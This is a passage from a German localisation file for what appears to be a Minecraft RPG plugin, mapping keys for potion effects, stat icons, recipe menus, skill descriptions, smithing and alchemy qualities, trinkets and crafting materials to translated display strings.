  ""effect_name_antibleed"": ""%icon% Blutstillung"",
  ""effect_name_recall"": ""%icon% Rückruf"",
  ""effect_name_custom_heal"": ""%icon% Heilung %value%"",
  ""effect_name_lapis_save_chance"": ""%icon% Lapiskonsumtion %value% %duration%"",
  ""effect_name_enchanting_refund_chance"": ""%icon% Erfahrungskugel-Rückgabewahrscheinlichkeit %value% %duration%"",
  ""effect_name_enchanting_refund_fraction"": ""%icon% Rückgegebene Erfahrungskugeln %value% %duration%"",
  ""effect_name_lingering_duration_multiplier"": ""%icon% Nachhall-Dauer %value% %duration%"",
  ""effect_name_lingering_radius_multiplier"": ""%icon% Nachhall-Reichweite %value% %duration%"",
  ""effect_name_splash_intensity_minimum"": ""%icon% Spritz-Effizienz %value% %duration%"",
  ""effect_name_entity_rare_drops"": ""%icon% Mobs-Schatz %value% %duration%"",
  ""effect_name_dig_speed"": ""%icon% Abbaugeschwindigkeit %value% %duration%"",
  ""effect_name_crossbow_magazine"": ""%icon% Magazinkapazität %value% %duration%"",
  ""effect_name_attack_reach_multiplier"": ""%icon% Angriffsreichweite %value% %duration%"",
  ""effect_name_generic_scale"": ""%icon% Größe %value% %duration%"",
  ""effect_name_generic_block_interaction_range"": ""%icon% Reichweite %value% %duration%"",
  ""effect_name_generic_step_height"": ""%icon% Schrittweite %value% %duration%"",
  ""effect_name_shield_disarming"": ""%icon% Schildentwaffen %value% %duration%"",
  ""effect_name_life_steal"": ""%icon% Lebensraub %value% %duration%"",
  ""effect_name_generic_gravity"": ""%icon% Gravitation %value% %duration%"",
  ""effect_name_generic_safe_fall_distance"": ""%icon% Fallhöhe %value% %duration%"",
  ""effect_name_generic_fall_damage_multiplier"": ""%icon% Fallschaden %value% %duration%"",
  ""stat_potion_positive_prefix"": ""&a"",
  ""stat_potion_negative_prefix"": ""&c"",
  
  ""stat_icon_bow_strength"": """",
  ""stat_icon_heal"": """",
  ""stat_icon_bad_omen"": """",
  ""stat_icon_harm"": """",
  ""stat_icon_saturation"": """",
  ""stat_icon_absorption"": """",
  ""stat_icon_conduit_power"": """",
  ""stat_icon_blindness"": """",
  ""stat_icon_darkness"": """",
  ""stat_icon_confusion"": """",
  ""stat_icon_damage_resistance"": """",
  ""stat_icon_fast_digging"": """",
  ""stat_icon_fire_resistance"": """",
  ""stat_icon_glowing"": """",
  ""stat_icon_health_boost"": """",
  ""stat_icon_hero_of_the_village"": """",
  ""stat_icon_hunger"": """",
  ""stat_icon_increase_damage"": """",
  ""stat_icon_invisibility"": """",
  ""stat_icon_jump"": """",
  ""stat_icon_levitation"": """",
  ""stat_icon_luck"": """",
  ""stat_icon_poison"": """",
  ""stat_icon_regeneration"": """",
  ""stat_icon_slow"": """",
  ""stat_icon_slow_digging"": """",
  ""stat_icon_slow_falling"": """",
  ""stat_icon_speed"": """",
  ""stat_icon_unluck"": """",
  ""stat_icon_water_breathing"": """",
  ""stat_icon_weakness"": """",
  ""stat_icon_wither"": """",
  ""stat_icon_night_vision"": """",
  ""stat_icon_arrow_damage"": """",
  ""stat_icon_ammo_consumption"": """",
  ""stat_icon_arrow_velocity"": """",
  ""stat_icon_arrow_accuracy"": """",
  ""stat_icon_arrow_piercing"": """",
  ""stat_icon_knockback"": """",
  ""stat_icon_stun_chance"": """",
  ""stat_icon_bleed_chance"": """",
  ""stat_icon_bleed_damage"": """",
  ""stat_icon_bleed_duration"": """",
  ""stat_icon_crit_chance"": """",
  ""stat_icon_crit_damage"": """",
  ""stat_icon_armor_penetration_flat"": """",
  ""stat_icon_light_armor_penetration_flat"": """",
  ""stat_icon_heavy_armor_penetration_flat"": """",
  ""stat_icon_armor_penetration_fraction"": """",
  ""stat_icon_light_armor_penetration_fraction"": """",
  ""stat_icon_heavy_armor_penetration_fraction"": """",
  ""stat_icon_heavy_armor_damage"": """",
  ""stat_icon_light_armor_damage"": """",
  ""stat_icon_immunity_bonus_fraction"": """",
  ""stat_icon_immunity_bonus_flat"": """",
  ""stat_icon_immunity_reduction"": """",
  ""stat_icon_damage_unarmed"": """",
  ""stat_icon_damage_melee"": """",
  ""stat_icon_damage_ranged"": """",
  ""stat_icon_damage_all"": """",
  ""stat_icon_attack_reach"": """",
  ""stat_icon_velocity_damage"": """",
  ""stat_icon_dismount_chance"": """",
  ""stat_icon_custom_damage_resistance"": """",
  ""stat_icon_explosion_resistance"": """",
  ""stat_icon_fall_damage_resistance"": """",
  ""stat_icon_custom_fire_resistance"": """",
  ""stat_icon_magic_resistance"": """",
  ""stat_icon_bleed_resistance"": """",
  ""stat_icon_stun_resistance"": """",
  ""stat_icon_poison_resistance"": """",
  ""stat_icon_projectile_resistance"": """",
  ""stat_icon_melee_resistance"": """",
  ""stat_icon_dodge_chance"": """",
  ""stat_icon_healing_bonus"": """",
  ""stat_icon_food_consumption"": """",
  ""stat_icon_cooldown_reduction"": """",
  ""stat_icon_explosion_power"": """",
  ""stat_icon_crafting_speed"": """",
  ""stat_icon_alchemy_quality"": """",
  ""stat_icon_alchemy_quality_fraction"": """",
  ""stat_icon_enchanting_quality"": """",
  ""stat_icon_enchanting_quality_fraction"": """",
  ""stat_icon_anvil_quality_flat"": """",
  ""stat_icon_anvil_quality_fraction"": """",
  ""stat_icon_smithing_quality"": """",
  ""stat_icon_smithing_quality_fraction"": """",
  ""stat_icon_brewing_ingredient_consumption"": """",
  ""stat_icon_brewing_speed"": """",
  ""stat_icon_potion_consumption"": """",
  ""stat_icon_throwing_velocity"": """",
  ""stat_icon_mining_rare_drops"": """",
  ""stat_icon_mining_drops"": """",
  ""stat_icon_woodcutting_rare_drops"": """",
  ""stat_icon_woodcutting_drops"": """",
  ""stat_icon_digging_rare_drops"": """",
  ""stat_icon_digging_drops"": """",
  ""stat_icon_farming_rare_drops"": "" "",
  ""stat_icon_farming_drops"": """",
  ""stat_icon_fishing_luck"": """",
  ""stat_icon_skill_exp_gain"": """",
  ""stat_icon_vanilla_exp_gain"": """",
  ""stat_icon_damage_taken"": """",
  ""stat_icon_reflect_chance"": """",
  ""stat_icon_reflect_fraction"": """",
  ""stat_icon_custom_luck"": """",
  ""stat_icon_armor_flat"": """",
  ""stat_icon_armor_fraction"": """",
  ""stat_icon_armor_toughness_flat"": """",
  ""stat_icon_armor_toughness_fraction"": """",
  ""stat_icon_attack_speed"": """",
  ""stat_icon_generic_luck"": """",
  ""stat_icon_generic_armor"": """",
  ""stat_icon_generic_armor_toughness"": """",
  ""stat_icon_generic_attack_damage"": """",
  ""stat_icon_generic_attack_speed"": """",
  ""stat_icon_generic_knockback_resistance"": """",
  ""stat_icon_generic_max_health"": """",
  ""stat_icon_generic_movement_speed"": """",
  ""stat_icon_knockback_resistance"": """",
  ""stat_icon_max_health_flat"": """",
  ""stat_icon_max_health_fraction"": """",
  ""stat_icon_movement_speed"": """",
  ""stat_icon_smithing_masterpiece_flat"": """",
  ""stat_icon_smithing_masterpiece_fraction"": """",
  ""stat_icon_enchanting_masterpiece_flat"": """",
  ""stat_icon_enchanting_masterpiece_fraction"": """",
  ""stat_icon_alchemy_masterpiece_flat"": """",
  ""stat_icon_alchemy_masterpiece_fraction"": """",
  ""stat_icon_chocolate_milk"": """",
  ""stat_icon_milk"": """",
  ""stat_icon_extra_explosion_damage"": """",
  ""stat_icon_extra_fire_damage"": """",
  ""stat_icon_extra_magic_damage"": """",
  ""stat_icon_extra_poison_damage"": """",
  ""stat_icon_extra_bludgeoning_damage"": """",
  ""stat_icon_extra_lightning_damage"": """",
  ""stat_icon_extra_freezing_damage"": """",
  ""stat_icon_extra_radiant_damage"": """",
  ""stat_icon_extra_necrotic_damage"": """",
  ""stat_icon_extra_attack_damage"": """",
  ""stat_icon_damage_explosion"": """",
  ""stat_icon_damage_fire"": """",
  ""stat_icon_damage_magic"": """",
  ""stat_icon_damage_poison"": """",
  ""stat_icon_damage_bludgeoning"": """",
  ""stat_icon_damage_lightning"": """",
  ""stat_icon_damage_freezing"": """",
  ""stat_icon_damage_radiant"": """",
  ""stat_icon_damage_necrotic"": """",
  ""stat_icon_durability_multiplier"": """",
  ""stat_icon_entity_drops"": """",
  ""stat_icon_cooking_speed"": """",
  ""stat_icon_sneak_movement_speed_bonus"": """",
  ""stat_icon_sprint_movement_speed_bonus"": """",
  ""stat_icon_stun"": """",
  ""stat_icon_light_armor"": """",
  ""stat_icon_heavy_armor"": """",
  ""stat_icon_fire"": """",
  ""stat_icon_bleed"": """",
  ""stat_icon_antibleed"": """",
  ""stat_icon_instant_explosion_damage"":"""",
  ""stat_icon_instant_fire_damage"": """",
  ""stat_icon_instant_poison_damage"": """",
  ""stat_icon_instant_magic_damage"": """",
  ""stat_icon_instant_melee_damage"": """",
  ""stat_icon_instant_projectile_damage"": """",
  ""stat_icon_instant_bludgeoning_damage"": """",
  ""stat_icon_instant_lightning_damage"": """",
  ""stat_icon_instant_freezing_damage"": """",
  ""stat_icon_instant_radiant_damage"": """",
  ""stat_icon_instant_necrotic_damage"": """",
  ""stat_icon_recall"": """",
  ""stat_icon_custom_heal"": """",
  ""stat_icon_lapis_save_chance"": """",
  ""stat_icon_enchanting_refund_chance"": """",
  ""stat_icon_enchanting_refund_fraction"": """",
  ""stat_icon_jumps"": """",
  ""stat_icon_jump_height"": """",
  ""stat_icon_dig_speed"": """",
  ""stat_icon_mining_speed"": """",
  ""stat_icon_crossbow_magazine"": """",
  ""stat_icon_attack_reach_multiplier"": """",
  ""stat_icon_generic_scale"": """",
  ""stat_icon_generic_block_interaction_range"": """",
  ""stat_icon_generic_step_height"": """",
  ""stat_icon_shield_disarming"": """",
  ""stat_icon_life_steal"": """",
  ""stat_icon_generic_gravity"": """",
  ""stat_icon_generic_safe_fall_distance"": """",
  ""stat_icon_generic_fall_damage_multiplier"": """",
  
  ""translation_next_page"": ""&7&lNächste Seite"",
  ""translation_previous_page"": ""&7&lVorherige Seite"",
  ""translation_page_up"": ""&7&lSeitenaufwärts"",
  ""translation_page_down"": ""&7&lSeitenabwärts"",
  ""selectionmenu_recipe_immersive"": ""&8Rezept auswählen"",
  ""selectionmenu_recipe_immersive_favourites"": ""&6Favoriten"",
  ""selectionmenu_recipe_immersive_craftonly"": ""&7Herstellungsrezepte"",
  ""selectionmenu_recipe_immersive_tinkeronly"": ""&7Tüftelrezepte"",
  ""recipe_favourited_prefix"": ""&e[✰]&r"",
  ""recipe_favourited_suffix"": """",
  ""recipe_ingredient_format"": ""&7- &e%item% &7x &e%amount%"",
  ""recipe_uncraftable"": ""&cNicht herstellbar."",
  ""potion_base_format"": ""&r&fTrank der %effect%"",
  ""potion_splash_format"": ""&r&fSplaschtrank der %effect%"",
  ""potion_lingering_format"": ""&r&fNachhallender Trank der %effect%"",
  ""tipped_arrow_format"": ""&r&f%item% der %effect%"",
  ""item_generic_format"": ""&r&f%item% der %effect%"",
  ""combined_potion_base_format"": ""&r&dTrank der %effect%"",
  ""combined_potion_splash_format"": ""&r&dTrank der %effect%"",
  ""combined_potion_lingering_format"": ""&r&dTrank der %effect%"",
  ""combined_tipped_arrow_format"": ""&r&d%item% der %effect%"",
  ""combined_item_generic_format"": ""&r&d%item% der %effect%"",
  ""transmutation_potion"": ""&#edc80eMidastrunk"",
  ""blast_tnt_fortune"": ""Glück %level%"",
  ""blast_tnt_silk"": ""Samthandschuh"",
  ""blast_tnt_none"": ""Normal"",
  ""ingredient_any_armor"": ""Rüstung"",
  ""ingredient_any_plank"": ""Brettchen"",
  ""ingredient_any_log"": ""Stamm"",
  ""ingredient_any_anvil"": ""Amboss"",
  ""ingredient_any_cauldron"": ""Kessel"",
  ""ingredient_any_wool"": ""Wolle"",
  ""ingredient_any_bed"": ""Bett"",
  ""ingredient_any_banner"": ""Banner"",
  ""ingredient_any_candle"": ""Kerze"",
  ""ingredient_any_carpet"": ""Teppich"",
  ""ingredient_any_coal_ore"": ""Kohle-Erz"",
  ""ingredient_any_diamond_ore"": ""Diamant-Erz"",
  ""ingredient_any_gold_ore"": ""Gold-Erz"",
  ""ingredient_any_iron_ore"": ""Eisen-Erz"",
  ""ingredient_any_lapis_ore"": ""Lapis-Erz"",
  ""ingredient_any_copper_ore"": ""Kupfer-Erz"",
  ""ingredient_any_emerald_ore"": ""Smaragd-Erz"",
  ""ingredient_any_redstone_ore"": ""Redstone-Erz"",
  ""ingredient_any_door"": ""Tür"",
  ""ingredient_any_fence"": ""Zaun"",
  ""ingredient_any_fence_gate"": ""Zauntor"",
  ""ingredient_any_boat"": ""Boot"",
  ""ingredient_any_leaves"": ""Blätter"",
  ""ingredient_any_pressure_plate"": ""Druckplatte"",
  ""ingredient_any_sand"": ""Sand"",
  ""ingredient_any_sign"": ""Schild"",
  ""ingredient_any_trap_door"": ""Luke"",
  ""ingredient_any_wood_equipment"": ""Holzausrüstung"",
  ""ingredient_any_bow"": ""Bogen"",
  ""ingredient_any_crossbow"": ""Armbrust"",
  ""ingredient_any_leather_equipment"": ""Lederausrüstung"",
  ""ingredient_any_stone_equipment"": ""Steinausrüstung"",
  ""ingredient_any_chainmail_equipment"": ""Kettenrüstung"",
  ""ingredient_any_gold_equipment"": ""Goldausrüstung"",
  ""ingredient_any_iron_equipment"": ""Eisenausrüstung"",
  ""ingredient_any_diamond_equipment"": ""Diamantausrüstung"",
  ""ingredient_any_netherite_equipment"": ""Netheritausrüstung"",
  ""ingredient_any_prismarine_equipment"": ""Prismarinausrüstung"",
  ""ingredient_any_enderic_equipment"": ""Enderische Ausrüstung"",
  ""ingredient_any_other_equipment"": ""Sonstige Ausrüstung"",
  ""ingredient_any_sword"": ""Schwert"",
  ""ingredient_any_trident"": ""Dreizack"",
  ""ingredient_any_helmet"": ""Helm"",
  ""ingredient_any_chestplate"": ""Brustplatte"",
  ""ingredient_any_leggings"": ""Beinschutz"",
  ""ingredient_any_boots"": ""Stiefel"",
  ""ingredient_any_shears"": ""Schere"",
  ""ingredient_any_flint_and_steel"": ""Feuerstein und Stahl"",
  ""ingredient_any_fishing_rod"": ""Angelrute"",
  ""ingredient_any_elytra"": ""Elytra"",
  ""ingredient_any_pickaxe"": ""Spitzhacke"",
  ""ingredient_any_axe"": ""Axt"",
  ""ingredient_any_shovel"": ""Schaufel"",
  ""ingredient_any_hoe"": ""Hacke"",
  ""ingredient_any_shield"": ""Schild"",
  ""ingredient_any_other"": ""Sonstiges Gegenstand"",
  ""ingredient_any_trinket"": ""Schmuckstück"",
  ""ingredient_any_bucket"": ""Eimer"",
  ""ingredient_any_potion"": ""Trank"",
  ""ingredient_any_stone_bricks"": ""Steinblöcke"",
  ""ingredient_any_deepslate_bricks"": ""Tiefsteinblöcke"",
  ""ingredient_any_quartz_bricks"": ""Quarzblöcke"",
  ""ingredient_any_blackstone_bricks"": ""Schwarzsteinblöcke"",
  ""ingredient_any_end_bricks"": ""Endstein-Blöcke"",
  ""tinker_result_format"": ""Bearbeitetes %item%"",
  ""party-rank-leader"": ""&6Anführer"",
  ""party-rank-rookie"": ""&7Neuling"",
  ""party-rank-member"": ""&7Mitglied"",
  ""party-rank-trusted"": ""&7Vertrauensperson"",
  ""party-rank-officer"": ""&eOffizier"",
  ""party-rank-inner-circle"": ""&e&lInnerer Kreis"",
  ""party-level-0"": ""&fBündnis"",
  ""party-level-1"": ""&aEinsatzgruppe"",
  ""party-level-2"": ""&2Crew"",
  ""party-level-3"": ""&eOrden"",
  ""party-level-4"": ""&6Gilde"",
  ""party-level-5"": ""&d&lLiga"",
  ""status-attack-dodged"": ""&fAngriff ausgewichen"",
  ""skill-power-description"": ""&8Levele andere Fertigkeiten, um Erfahrung für dein Powerlevel zu erhalten. Level auf, um Fertigkeitspunkte für andere Perks auszugeben"",
  ""skill-power-displayname"": ""&7Macht"",
  ""skill-power-level-bar"": ""&7Machtlevel &eLV&e%lv_current% &6%exp_current%&7/&6%exp_next% &7(&e%exp%&7)"",
  ""smithing-quality-terrible"": ""&4Furchtbar"",
  ""smithing-quality-shoddy"": ""&cSchlecht"",
  ""smithing-quality-decent"": ""&7Ordentlich"",
  ""smithing-quality-good"": ""&7Gut"",
  ""smithing-quality-great"": ""&eGrößartig"",
  ""smithing-quality-flawless"": ""&eFehlerfrei"",
  ""smithing-quality-masterful"": ""&6Meisterhaft"",
  ""smithing-quality-fabled"": ""&6&lSagenhaft"",
  ""smithing-quality-peerless"": ""&8&lUnerreicht"",
  ""smithing-tag-plated"": ""&8Beschichtet"",
  ""smithing-tag-unmendable"": ""&cUnrepariebar"",
  ""smithing-tag-unenchantable"": ""&cUnverzauberbar"",
  ""smithing-tag-razor-sharp"": ""&7Messerscharf"",
  ""smithing-tag-well-fit"": ""&7Gut sitzend"",
  ""smithing-tag-red-hot"": ""&6Rotglühend"",
  ""smithing-tag-white-hot"": ""&eWeißglühend"",
  ""smithing-tag-disallowed-plated"": ""&8Bereits beschichtet!"",
  ""smithing-tag-disallowed-unenchantable"": ""&cGegenstand muss verzauberbar sein!"",
  ""smithing-tag-disallowed-unmendable"": ""&cGegenstand muss reparierbar sein!"",
  ""smithing-tag-disallowed-razor-sharp"": ""&cGegenstand kann nicht weiter geschärft werden!"",
  ""smithing-tag-disallowed-well-fit"": ""&cGegenstand kann nicht besser sitzend gemacht werden!"",
  ""smithing-tag-disallowed-red-hot"": ""&cGegenstand kann nicht heißer werden!"",
  ""smithing-tag-disallowed-white-hot"": ""&cGegenstand kann nicht heißer werden!"",
  ""smithing-tag-required-plated"": ""&cGegenstand muss beschichtet sein!"",
  ""smithing-tag-required-unenchantable"": ""&cGegenstand muss unverzauberbar sein!"",
  ""smithing-tag-required-unmendable"": ""&cGegenstand muss unrepariebar sein!"",
  ""smithing-tag-required-razor-sharp"": ""&cGegenstand muss bereits geschärft sein!"",
  ""smithing-tag-required-well-fit"": ""&cGegenstand muss bereits gut sitzend sein!"",
  ""smithing-tag-required-red-hot"": ""&cGegenstand muss rotglühend sein!"",
  ""smithing-tag-required-white-hot"": ""&cGegenstand muss weißglühend sein!"",
  ""skill-smithing-description"": ""&8Übe Schmiedekunst, um Werkzeuge und Ausrüstung von immer besserer Qualität herzustellen"",
  ""skill-smithing-displayname"": ""&7Schmiedekunst"",
  ""skill-smithing-level-bar"": ""&7Schmiedekunst &eLV&e%lv_current% &6%exp_current%&7/&6%exp_next% &7(&e%exp%&7)"",
  ""skill-mining-drilling-enabled"": ""&aBohren aktiviert"",
  ""skill-mining-drilling-disabled"": ""&cBohren abgelaufen"",
  ""skill-mining-description"": ""&8Übe Bergbau, um deine Erzförderung zu erhöhen, die Effektivität des Sprengabbaus zu steigern und seltene Mineralien zu finden, die für das Craften nützlich sind"",
  ""skill-mining-displayname"": ""&7Bergbau"",
  ""skill-mining-level-bar"": ""&7Bergbau &cLV %lv_current% &4%exp_current%&7/&4%exp_next% &7(&c%exp%&7)"",
  ""skill-light-weapons-description"": ""&8Leichte Waffen sind nicht sehr effektiv gegen schwere Rüstungen, greifen aber viel schneller an und können mit genug Übung Angriffe abwehren"",
  ""skill-light-weapons-displayname"": ""&7Leichte Waffen"",
  ""skill-light-weapons-level-bar"": ""&7Leichte Waffen &eLV %lv_current% &6%exp_current%&7/&6%exp_next% &7(&e%exp%&7)"",
  ""skill-light-armor-description"": ""&8Übe leichte Rüstung, um deine Ausweichfähigkeiten zu verbessern und trotzdem gut geschützt zu bleiben, ohne viel Bewegungsfreiheit aufzugeben."",
  ""skill-light-armor-displayname"": ""&7Leichte Rüstung"",
  ""skill-light-armor-level-bar"": ""&7Leichte Rüstung &eLV %lv_current% &6%exp_current%&7/&6%exp_next% &7(&e%exp%&7)"",
  ""skill-woodcutting-description"": ""&8Übe Holzfällen, um deine Holzernte zu steigern, deine Baufähigkeiten zu verbessern und mehr Baumaterial aus weniger Ressourcen zu gewinnen"",
  ""skill-woodcutting-displayname"": ""&7Holzfällen"",
  ""skill-woodcutting-level-bar"": ""&7Holzfällen &aLV %lv_current% &2%exp_current%&7/&2%exp_next% &7(&a%exp%&7)"",
  ""skill-digging-description"": ""&8Übe Graben, um deine Ausbeute aus der Erde zu erhöhen, mehr Schätze bei archäologischen Funden zu finden und die Fähigkeit zu erlangen, kleine Gegenstände aus Sand und Kies zu sieben"",
  ""skill-digging-displayname"": ""&7Graben"",
  ""skill-digging-level-bar"": ""&7Graben &aLV %lv_current% &2%exp_current%&7/&2%exp_next% &7(&a%exp%&7)"",
  ""skill-heavy-weapons-description"": ""&8Schwere Waffen sind nicht sehr effektiv dabei, eingehende Angriffe zu blocken, treffen aber viel härter und sind effektiver gegen Rüstungen"",
  ""skill-heavy-weapons-displayname"": ""&7Schwere Waffen"",
  ""skill-heavy-weapons-level-bar"": ""&7Schwere Waffen &cLV %lv_current% &4%exp_current%&7/&4%exp_next% &7(&c%exp%&7)"",
  ""skill-heavy-armor-description"": ""&8Übe schwere Rüstung, um den erlittenen Schaden stark zu reduzieren und zu einem unbesiegbaren Gegner zu werden, was aber auf Kosten etwas Bewegungsfreiheit geht"",
  ""skill-heavy-armor-displayname"": ""&7Schwere Rüstung"",
  ""skill-heavy-armor-level-bar"": ""&7Schwere Rüstung &cLV %lv_current% &4%exp_current%&7/&4%exp_next% &7(&c%exp%&7)"",
  ""skill-fishing-description"": ""&8Übe Angeln, um... mehr Fisch zu fangen. Und um gesunkene Schätze zu finden. Verwende Köder, um seltene Gegenstände häufiger zu erbeuten"",
  ""skill-fishing-displayname"": ""&7Angeln"",
  ""skill-fishing-level-bar"": ""&7Angeln &bLV %lv_current% &9%exp_current%&7/&9%exp_next% &7(&b%exp%&7)"",
  ""skill-farming-description"": ""&8Übe Landwirtschaft, um die Ernte deiner Pflanzen und Tiere zu steigern, Honig sicher zu ernten und seltene Pflanzen und Zutaten zu sammeln."",
  ""skill-farming-displayname"": ""&7Landwirtschaft"",
  ""skill-farming-level-bar"": ""&7Landwirtschaft &aLV %lv_current% &2%exp_current%&7/&2%exp_next% &7(&a%exp%&7)"",
  ""skill-enchanting-description"": ""&8Übe Verzauberung, um deine Fähigkeit zu verbessern, Gegenstände mit Magie aufzuladen, sowohl am Verzauberungstisch als auch am Amboss. Erreiche Verzauberungsstufen, die zuvor unmöglich waren"",
  ""skill-enchanting-displayname"": ""&7Verzauberung"",
  ""skill-enchanting-elemental-blade-activation-actionbar"": ""&8[[&dHexklinge aktiviert&8]]"",
  ""skill-enchanting-elemental-blade-expiration-actionbar"": ""&8[[&7Hexklinge abgelaufen&8]]"",
  ""skill-enchanting-elemental-blade-activation-chat"": """",
  ""skill-enchanting-elemental-blade-expiration-chat"": """",
  ""skill-enchanting-level-bar"": ""&7Verzauberung &bLV&b%lv_current% &9%exp_current%&7/&9%exp_next% &7(&b%exp%&7)"",
  ""skill-archery-description"": ""&8Übe Bogenschießen, um deinen Fernkampfschaden zu erhöhen, deine Treffergenauigkeit zu verbessern und Ziele aus sicherer Entfernung konstant zu töten. Das Üben des Bogenschießens dauert lange, aber es ist argumentativ die stärkste aller Kampffähigkeiten"",
  ""skill-archery-displayname"": ""&7Bogenschießen"",
  ""skill-archery-level-bar"": ""&7Bogenschießen &eLV %lv_current% &6%exp_current%&7/&6%exp_next% &7(&e%exp%&7)"",
  ""heavy-weapons-warning-dual-wielding"": ""TITLE(&cZu schwer! Angriffsgeschwindigkeit reduziert;&7Kann nicht zwei Gegenstände mit schweren Waffen führen;40;5)"",
  ""alchemy-quality-rancid"": ""&cRanzig"",
  ""alchemy-quality-tainted"": ""&7Verunreinigt"",
  ""alchemy-quality-dirty"": ""&7Schmutzig"",
  ""alchemy-quality-cloudy"": ""&7Trüb"",
  ""alchemy-quality-clear"": ""&bKlar"",
  ""alchemy-quality-refined"": ""&bRaffiniert"",
  ""alchemy-quality-pure"": ""&f&lRein"",
  ""alchemy-quality-shimmering"": ""&d&lSchimmernd"",
  ""alchemy-treatment-concentrated"": ""&7Konzentriert"",
  ""alchemy-treatment-diluted"": ""&7Verdünnt"",
  ""alchemy-treatment-filtered"": ""&7Gefiltert"",
  ""alchemy-treatment-empowered"": ""&7Verstärkt"",
  ""alchemy-treatment-imbued"": ""&7Erfüllt"",
  ""alchemy-treatment-enchanted"": ""&7Verzaubert"",
  ""alchemy-treatment-polluted"": ""&7Verunreinigt"",
  ""alchemy-treatment-disallowed-concentrated"": ""&cTrank kann nicht bereits konzentriert sein!"",
  ""alchemy-treatment-disallowed-diluted"": ""&cTrank kann nicht bereits verdünnt sein!"",
  ""alchemy-treatment-disallowed-filtered"": ""&cTrank kann nicht bereits gefiltert sein!"",
  ""alchemy-treatment-disallowed-empowered"": ""&cGegenstand kann nicht bereits verstärkt sein!"",
  ""alchemy-treatment-disallowed-imbued"": ""&cGegenstand kann nicht bereits erfüllt sein!"",
  ""alchemy-treatment-disallowed-enchanted"": ""&cTrank kann nicht bereits verzaubert sein!"",
  ""alchemy-treatment-disallowed-polluted"": ""&cTrank kann nicht bereits verunreinigt sein!"",
  ""alchemy-treatment-required-concentrated"": ""&cTrank muss konzentriert sein!"",
  ""alchemy-treatment-required-diluted"": ""&cTrank muss verdünnt sein!"",
  ""alchemy-treatment-required-filtered"": ""&cTrank muss gefiltert sein!"",
  ""alchemy-treatment-required-empowered"": ""&cGegenstand muss verstärkt sein!"",
  ""alchemy-treatment-required-imbued"": ""&cGegenstand muss erfüllt sein!"",
  ""alchemy-treatment-required-enchanted"": ""&cTrank muss verzaubert sein!"",
  ""alchemy-treatment-required-polluted"": ""&cTrank muss verunreinigt sein!"",
  ""skill-alchemy-description"": ""&8Übe Alchemie, um Tränke und Gifte von extremer Potenz herzustellen und lerne, wie du Materialien transmutieren kannst"",
  ""skill-alchemy-displayname"": ""&7Alchemie"",
  ""skill-alchemy-level-bar"": ""&7Alchemie &dLV %lv_current% &5%exp_current%&7/&5%exp_next% &7(&d%exp%&7)"",
  ""trinket-adhesive-bandaid"": ""&eKlebriger Verband"",
  ""trinket-transfusion"": ""&dTransfusion"",
  ""trinket-bezoar"": ""&eBezoar"",
  ""trinket-purity"": ""&dReinheit"",
  ""trinket-band-of-regeneration"": ""&eRegenerationsgürtel"",
  ""trinket-rebirth"": ""&dNeugeburt"",
  ""trinket-band-of-precision"": ""&ePräzisionsgürtel"",
  ""trinket-deathbringer"": ""&dTodesbringer"",
  ""trinket-band-of-force"": ""&eKraftgürtel"",
  ""trinket-titans-glove"": ""&dTitanenhandschuh"",
  ""trinket-armored-bracer"": ""&eGepanzerter Armschutz"",
  ""trinket-juggernaut"": ""&dWuchtbrecher"",
  ""trinket-magic-quiver"": ""&eZauberischer Köcher"",
  ""trinket-artemis"": ""&dArtemis"",
  ""trinket-amulet-of-vitality"": ""&eAmulett der Vitalität"",
  ""trinket-erinle"": ""&dSegen von Erinle"",
  ""trinket-amulet-of-adrenaline"": ""&eAmulett der Adrenalinsteuerung"",
  ""trinket-hermes"": ""&dHermes"",
  ""trinket-cross-necklace"": ""&eKreuzkette"",
  ""trinket-divine-necklace"": ""&dGöttliche Kette"",
  ""trinket-amulet-of-mania"": ""&eAmulett des Wahnsinns"",
  ""trinket-fury"": ""&dZorngeschmiedeter Anhänger"",
  ""trinket-amulet-of-the-avenger"": ""&eAmulett des Rächers"",
  ""trinket-kratos"": ""&dKratos"",
  ""trinket-ring-of-deflection"": ""&eAbwehrender Ring"",
  ""trinket-athena"": ""&dAthena"",
  ""trinket-ring-of-obsidian"": ""&eObsidianring"",
  ""trinket-narya"": ""&dNarya"",
  ""trinket-ring-of-protection"": ""&eSchützender Ring"",
  ""trinket-primordial-ring"": ""&dUrzeitlicher Ring"",
  ""trinket-ring-of-warding"": ""&eVerteidigungsring"",
  ""trinket-ring-of-magnus"": ""&dMagnusring"",
  ""trinket-ring-of-shattering"": ""&eZerschmetternder Ring"",
  ""trinket-paladins-bane"": ""&dPaladin's Fluch"",
  ""trinket-ring-of-reach"": ""&eReichweiteerhöhender Ring"",
  ""trinket-gungnirs-might"": ""&dGungnirs Macht"",
  ""trinket-tag-accessory"": ""&8Accessoire"",
  ""trinket-tag-ring"": ""&8Ring"",
  ""trinket-tag-necklace"": ""&8Kette"",
  ""trinket-tag-armband"": ""&8Armband"",
  ""trinket-tag-belt"": ""&8Gürtel"",
  ""trinket-tag-mask"": ""&8Maske"",
  ""trinket-tag-pin"": ""&8Anstecker"",
  ""trinket-tag-circlet"": ""&8Stirnreif"",
  ""material-dummy-head"": ""&fDummykopf"",
  ""material-crystal-apple"": ""&aKristallener Apfel"",
  ""material-diamond-shard"": ""&fDiamantscherbe"",
  ""material-hot-gold-ingot"": ""&6Heißer Goldbarren"",
  ""material-hot-iron-ingot"": ""&6Heißer Eisenbarren"",
  ""material-unstable-diamond"": ""&dUnstabiler Diamant"",
  ""material-hot-netherite-ingot"": ""&bGlühender Netheritebarren"",
  ""material-sharpening-stone"": ""&fSchleifstein"",
  ""material-polishing-stone"": ""&fWetzstein"",
  ""material-experience-gem"": ""&aSeelenvoller Amethyst"",
  ""material-opal"": ""&fOpal"",
  ""material-raw-opal"": ""&fRoheropal"",
  ""material-peridot"": ""&fPeridot"",
  ""material-raw-peridot"": ""&fRoherperidot"",
  ""material-ruby"": ""&fRubin"",
  ""material-raw-ruby"": ""&fRoherrubin"",
  ""material-sapphire"": ""&fSaphir"",
  ""material-raw-sapphire"": ""&fRohersaphir"",
  ""material-topaz"": ""&fTopas"",
  ""material-raw-topaz"": ""&fRoherTopas"",
  ""material-gold-strip"": ""&fGoldleiste"",
  ""material-gold-plate"": ""&fGoldplatte"",
  ""material-leather-strip"": ""&fLederstreifen"",
  ""material-netherite-shears"": ""&fNetheriteKlingen"",
  ""material-gold-bracer"": ""&fGoldarmschiene"",
  ""material-gold-necklace"": ""&fGoldkette"",
  ""material-diamond-dust"": ""&fDiamantstaub"",
  ""material-alchemical-powder"": ""&fAlchemistenpulver"",
  ""material-gold-ring"": ""&fGoldring"",
